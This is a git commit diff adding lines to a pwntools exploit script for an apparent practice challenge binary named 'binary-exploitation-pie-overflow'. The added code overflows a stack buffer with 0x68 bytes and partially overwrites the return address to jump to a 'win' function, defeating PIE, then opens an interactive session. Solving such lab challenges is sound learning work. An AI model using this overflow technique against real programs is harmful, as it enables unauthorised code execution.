f22664ead1d41b5f3936cd7e09e86ce24292f6fc
jbelkerf <jbelkerf@gmail.com>
2025-09-10 17:55:10 +0100

    sync

--- pwn/hard_pie/exp.py
+++ pwn/hard_pie/exp.py
@@ -12,4 +12,14 @@ from pwn import *
     Stripped:   No
 '''
 r = process('/challenge/binary-exploitation-pie-overflow')
+save_addr = 0x21c6
+#0000000000002140 <main>:
+main_offset = 0x2140
+win_offset = 0x1f37
+offset = 0x60 + 8
+payload = offset * b'A' + b'\x37\x1f' #+ b'\x21'
+print(r.recvline().decode())
+r.send(payload )
+r.interactive()
+# main + 0x86
 
